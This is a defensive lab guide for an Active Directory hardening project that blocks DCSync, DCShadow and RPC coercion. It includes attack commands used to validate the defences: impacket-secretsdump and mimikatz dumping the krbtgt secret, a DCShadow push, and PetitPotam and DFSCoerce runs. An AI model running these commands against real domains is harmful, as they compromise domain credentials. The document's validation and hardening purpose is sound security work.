# Reproducing the Lab

End-to-end instructions to rebuild the exact lab used to develop and validate this stack, then run the attack matrix that produced the PoC results in [docs/DCSync-Prevention-Complete-Guide.md](docs/DCSync-Prevention-Complete-Guide.md) § 14.

**Time budget:** ~4 hours for a fresh build if you don't wait for silo/DRSI soak periods, ~1 week if you do.

**Safety:** everything runs in an isolated lab. Never on production. Snapshot before each numbered phase.

---

## Part 1 — Lab environment prerequisites

### VM inventory

| VM | Role | OS | IP | Notes |
|---|---|---|---|---|
| DC | First DC | Windows Server 2019 Standard | 192.168.20.1/24 | Domain `lab.local`, PDC emulator |
| DC2 | Second DC | Windows Server 2019 Datacenter | 192.168.20.2/24 | Joins after Phase 0.5 |
| SQL | Member server | Windows Server 2019 Standard | 192.168.20.30/24 | For legit-client validation |
| Kali | Attacker | Kali Linux (any recent) | 192.168.20.50/24 | Impacket, mimikatz (Windows binary) |

All four on the same isolated network segment (`192.168.20.0/24`). No routing to production.

### Software on Kali

```bash
apt-get update && apt-get install -y python3-impacket
git clone https://github.com/topotam/PetitPotam.git
git clone https://github.com/Wh04m1001/DFSCoerce.git
```

### Software staged on DC and DC2

Copy `mimikatz.exe` (Windows binary, obtain from your usual source) to `C:\Users\t0-admin\Desktop\` on each DC after Phase 1.0.

Copy this repo to `C:\Hardening\Repo\` on DC (one DC is enough — DCFWTool and rpcfirewall install into system paths from there).

### Build tools on your workstation

To compile the modified rpcFireWall.dll:

- Visual Studio 2019 or 2022 with C++ desktop development workload
- Windows 10/11 SDK
- MSBuild command-line access

---

## Part 2 — Build the modified RPC Firewall DLL

The core hooking DLL that carries our DRS Request-Inspection module. Build once, deploy to every DC.

### On your workstation

```powershell
cd C:\Hardening\Repo\rpcfirewall
```

Restore NuGet packages (Detours + EasyHook):

```powershell
nuget restore RPCFW.sln
```

Build Release x64:

```powershell
& "$env:ProgramFiles\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" RPCFW.sln /p:Configuration=Release /p:Platform=x64
```

If Visual Studio isn't at that path, run VS's "Developer PowerShell for VS 2022" instead and use `msbuild RPCFW.sln /p:Configuration=Release /p:Platform=x64`.

Output files land in `rpcfirewall\x64\Release\`:

- `rpcFireWall.dll` (case-sensitive filename: capital F, capital W)
- `rpcFwManager.exe`
- `rpcMessages.dll`

Verify the three files exist and note their `LastWriteTime` matches your build.

---

## Part 3 — Build the domain

Follow the phases in this exact order. Every command is copy-paste; every result in the "Expected" columns was observed in our lab.

### Phase 0 — Baseline

On DC as built-in Administrator (elevated):

```powershell
New-Item -ItemType Directory C:\Hardening -Force | Out-Null; Import-Module ActiveDirectory
```

```powershell
dcdiag /q; dcdiag /test:Replications /v > C:\Hardening\baseline_repl.txt
```

```powershell
Get-ADDomainController -Filter * | Select Name, HostName, IPv4Address, Site
```

```powershell
$nc = (Get-ADDomain).DistinguishedName; $replRights = @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c'); (Get-Acl "AD:$nc").Access | Where-Object { $_.ObjectType -in $replRights } | Format-Table IdentityReference, ActiveDirectoryRights, ObjectType
```

**Expected:** only default replication-rights principals appear (SYSTEM, Administrators, Enterprise DCs, Domain Controllers, RODCs).

Snapshot: `phase0-baseline`.

### Phase 0.5 — Add DC2

Follow `docs/DCSync-Hardening-Clean-StepByStep.md` § Phase 0.5. Reboot DC2 twice (once after IP/hostname change, once after promotion). Verify both DCs replicate cleanly.

Snapshot: `phase0.5-dc2-joined`.

### Phase 1.0 — Create `t0-admin`

On DC as built-in Administrator. Full command block in the clean step-by-step. After creating and rotating the built-in Administrator password, **log out and log back in as `t0-admin`**, then launch elevated PowerShell for all further work.

Copy `mimikatz.exe` to `C:\Users\t0-admin\Desktop\` on both DCs.

Snapshot: `phase1.0-tier0-admin-created`.

### Phase 1 — Identity ACLs

Run the OWNER RIGHTS, SACL, and honeytoken commands from § Phase 1 of the clean step-by-step.

Snapshot: `phase1-identity-done`.

### Phase 3 — Kerberos armoring (before silo!)

On EACH DC:

```powershell
$kdc = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\KDC\Parameters'; $cli = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters'; foreach ($p in @($kdc, $cli)) { if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }; New-ItemProperty -Path $p -Name EnableCbacAndArmor -Value 1 -PropertyType DWord -Force | Out-Null }
```

Reboot each DC. Verify both `EnableCbacAndArmor : 1` entries return with `Get-ItemProperty` afterward.

Snapshot: `phase3-armoring-verified`.

### Phase 2 — Tier-0 silo

Create the auth policy and silo in **audit mode** first. Add members (`t0-admin`, `DC$`, `DC2$`). Soak ≥24 h watching for 4820/4821 events on both DCs.

Only after clean soak: set `-Enforce:$true`, force replication, then reboot each DC (one at a time). Full command block in the clean step-by-step § Phase 2.

Snapshot: `phase2-tier0-enforced`.

### Phase 4 — Coercion filters + Spooler off

On each DC:

```powershell
netsh -f C:\Hardening\Repo\patches\dc-rpc-filters.rsp
```

(File is provided in `patches/`; see § Coercion filter `.rsp` below to recreate if missing.)

```powershell
Stop-Service Spooler -Force; Set-Service Spooler -StartupType Disabled
```

**Attack test — PetitPotam from Kali:**

```bash
cd PetitPotam
python3 PetitPotam.py -u t0-admin -p '<pw>' -d lab.local 192.168.20.50 192.168.20.1
```

**Expected:** `RPC_ACCESS_DENIED` on `EfsRpcOpenFileRaw`, then `STATUS_PIPE_DISCONNECTED`. No auth callback arrives.

Snapshot: `phase4-coercion-blocked`.

### Phase 5 — DCFWTool GPO + static ports

On each DC, set static ports (registry + `dfsrdiag`), reboot. Full commands in clean step-by-step § Phase 5.1.

On ONE DC only, from `C:\Hardening\Repo\DCFWTool\`:

Edit `Set-ADDSFirewallPolicy.json` if your IPs differ from `lab.local` defaults, then:

```powershell
cd C:\Hardening\Repo\DCFWTool; .\Set-ADDSFirewallPolicy.ps1
```

Verify the GPO was linked (this is not always automatic):

```powershell
Import-Module GroupPolicy; $dcOU = "OU=Domain Controllers,$((Get-ADDomain).DistinguishedName)"; $links = Get-GPInheritance -Target $dcOU | Select-Object -ExpandProperty GpoLinks; if ($links.DisplayName -notcontains 'Domain Controller Firewall') { New-GPLink -Name 'Domain Controller Firewall' -Target $dcOU -LinkEnabled Yes -Enforced Yes }
```

`gpupdate /force` on both DCs. Reboot each.

**Attack surface test from Kali:**

```bash
nmap -Pn -sT -p 88,135,389,445,464,636,3268,3269,3389,5985,38901,38902,5722 192.168.20.1
```

**Expected:** 88/389/464/636/3268/3269/135/445 open; 3389/5985/5722 filtered; 38901/38902 open (RPC clients still need them for `DsGetDcName`-class calls).

Snapshot: `phase5-dcfw-live`.

### Phase 6 — RPC Firewall base rules

On each DC, from your fresh build's output:

Copy `rpcFireWall.dll`, `rpcFwManager.exe`, `rpcMessages.dll` to `C:\Program Files\RpcFirewall\` (create the directory first).

Also copy `rpcFireWall.dll` to `C:\Windows\System32\` — lsass loads it from there.

Save the config:

```powershell
cd 'C:\Program Files\RpcFirewall'
```

```powershell
$conf = @'
flt:action:block audit:true uuid:c681d488-d850-11d0-8c52-00c04fd90f7e
flt:action:block audit:true uuid:df1941c5-fe89-4e79-bf10-463657acf44d
flt:action:block audit:true uuid:4fc742e0-4a10-11cf-8273-00aa004ae673
flt:action:block audit:true uuid:12345678-1234-abcd-ef00-0123456789ab
fw:uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 sid:S-1-5-9 opnum:3 action:allow audit:true
fw:uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 sid:S-1-5-9 opnum:5 action:allow audit:true
fw:uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 opnum:3 action:block audit:true
fw:uuid:e3514235-4b06-11d1-ab04-00c04fc2dcd2 opnum:5 action:block audit:true
'@; Set-Content -Path .\RpcFw.conf -Value $conf -Encoding ASCII
```

```powershell
.\rpcFwManager.exe /install; .\rpcFwManager.exe /start
```

Reboot.

After reboot, verify DLL is loaded:

```powershell
Get-Process lsass -Module | Where-Object ModuleName -like "*RpcF*" | Format-Table Size, ModuleName, FileName -AutoSize
```

**Attack tests (all four must return `rpc_s_access_denied`):**

DCSync from Kali against each DC:

```bash
impacket-secretsdump 'lab.local/t0-admin:<pw>@192.168.20.1' -just-dc-user krbtgt
impacket-secretsdump 'lab.local/t0-admin:<pw>@192.168.20.2' -just-dc-user krbtgt
```

DCSync as `t0-admin` on the DC console:

```powershell
& 'C:\Users\t0-admin\Desktop\mimikatz.exe' 'privilege::debug' 'lsadump::dcsync /domain:lab.local /user:krbtgt' 'exit'
```

DCShadow as `t0-admin` on the DC console (two elevated shells):

Shell 1 (server):
```powershell
& 'C:\Users\t0-admin\Desktop\mimikatz.exe' 'privilege::debug' 'lsadump::dcshadow /object:CN=t0-admin,OU=Tier-0,DC=lab,DC=local /attribute:description /value:PWND'
```

Shell 2 (push):
```powershell
& 'C:\Users\t0-admin\Desktop\mimikatz.exe' 'privilege::debug' 'lsadump::dcshadow /push' 'exit'
```

Verify the description did NOT change:
```powershell
Get-ADUser t0-admin -Properties Description | Select-Object Description
```

**Expected:** empty Description. RPC Exception 5 in mimikatz output. RPCFW event log shows Event 3 entries with the block details.

Snapshot: `phase6-rpcfw-live`.

### Phase 7 — DRS Request-Inspection module (AUDIT → DETECT)

Copy `C:\Hardening\Repo\rpcfirewall\scripts\Deploy-DrsHarden.ps1` to each DC. Run on each DC:

```powershell
cd C:\Hardening; .\Deploy-DrsHarden.ps1 -SeedAllowlist
```

Enable AUDIT:

```powershell
$dir = (Get-ItemProperty 'HKLM:\SOFTWARE\Hardening\DrsInspect').DataDir; New-Item -ItemType File "$dir\drsi_enabled" | Out-Null
```

Generate one legit + one attack cycle. Check `decisions.log`:

```powershell
Get-Content "$dir\decisions.log" -Tail 10
```

**Expected:** legit shows `decision=ALLOW partner=1`; Kali attack shows `decision=BLOCK enforced=0 partner=0`.

After a soak (or if you want to skip ahead in the lab), enable DETECT:

```powershell
New-Item -ItemType File "$dir\drsi_enforce_shape" | Out-Null
```

Rerun Kali attack. Log line now shows `enforced=1`.

Snapshot: `phase7-detect`.

### Optional — local-SYSTEM ncalrpc block

Follow the § Optional advanced block in `docs/DCSync-Hardening-Clean-StepByStep.md`. This closes local mimikatz-as-SYSTEM DCSync (test A of the transport-isolation harness).

Snapshot: `phase-optional-ncalrpc-block-live`.

---

## Part 4 — Attack matrix validation

Use [scripts/Test-DcsyncTransports.ps1](scripts/Test-DcsyncTransports.ps1) to run the SYSTEM-context transport isolation tests without manual PsExec fiddling.

**On DC (elevated as t0-admin):**

```powershell
cd C:\Hardening\Repo\scripts; .\Test-DcsyncTransports.ps1 -PeerDcFqdn 'DC2.lab.local'
```

**On DC2:**

```powershell
.\Test-DcsyncTransports.ps1 -PeerDcFqdn 'DC.lab.local'
```

Expected outputs correspond to the matrix in `docs/DCSync-Prevention-Complete-Guide.md` § 14. Summarised:

| Test | Without optional advanced | With optional advanced |
|---|---|---|
| A (local SYSTEM DCSync via ncalrpc) | SUCCEEDED — full krbtgt dump | **BLOCKED** — `RPC Exception 5` at DsBind |
| B (cross-DC SYSTEM DCSync via TCP) | SUCCEEDED | Still SUCCEEDED — true wire-level ceiling |

DCShadow validation is manual (two-shell test in Phase 6 above).

Coercion validation:

```bash
python3 PetitPotam.py -u t0-admin -p '<pw>' -d lab.local 192.168.20.50 192.168.20.1
python3 dfscoerce.py -u t0-admin -p '<pw>' -d lab.local 192.168.20.50 192.168.20.1
```

Both must fail with connection/pipe errors before any NTLM callback arrives.

---

## Part 5 — Coercion filter `.rsp` (if you need to recreate it)

```
rpc filter
add rule layer=um actiontype=block
add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
add filter

add rule layer=um actiontype=block
add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
add filter

add rule layer=um actiontype=block
add condition field=if_uuid matchtype=equal data=4fc742e0-4a10-11cf-8273-00aa004ae673
add filter

add rule layer=um actiontype=block
add condition field=if_uuid matchtype=equal data=12345678-1234-abcd-ef00-0123456789ab
add filter
```

Save as `patches/dc-rpc-filters.rsp` in the repo, then load on each DC with `netsh -f`.

---

## Part 6 — Cleanup and re-testing

Reset to a clean state by reverting all snapshots back to `phase0-baseline`.

To re-run only the attack matrix without rebuilding the domain, revert to `phase7-detect` (or `phase-optional-ncalrpc-block-live` if you want the ncalrpc block in the mix).

---

## Reading order for the full picture

1. [docs/DCSync-Prevention-Explained.md](docs/DCSync-Prevention-Explained.md) — 5-minute overview
2. This file — build the lab
3. [docs/DCSync-Prevention-Complete-Guide.md](docs/DCSync-Prevention-Complete-Guide.md) — everything including rationale, code changes, PoC results
4. [docs/DCSync-Hardening-Runbook.md](docs/DCSync-Hardening-Runbook.md) — extended runbook with Fixes log for anything that goes wrong

## Known caveats

- The lab environment ran Windows Server 2019 build 17763 patched to November 2022. Newer builds may behave differently. RPC filter SDDL evaluation especially can vary — verify on your version.
- Mimikatz behaviour changes across versions. Findings here used a 2020-vintage build. Newer or custom-built mimikatz can spoof the DsBind PID field and defeat the fingerprint discussed in the Complete Guide.
- Kali Impacket versions vary. `secretsdump.py` and `PetitPotam.py` interfaces have shifted; adjust command-line syntax to your version.
- Phase 8 (WDAC) is not built in this repo. It is the recommended next step and the only mitigation for cross-DC SYSTEM DCSync/DCShadow.
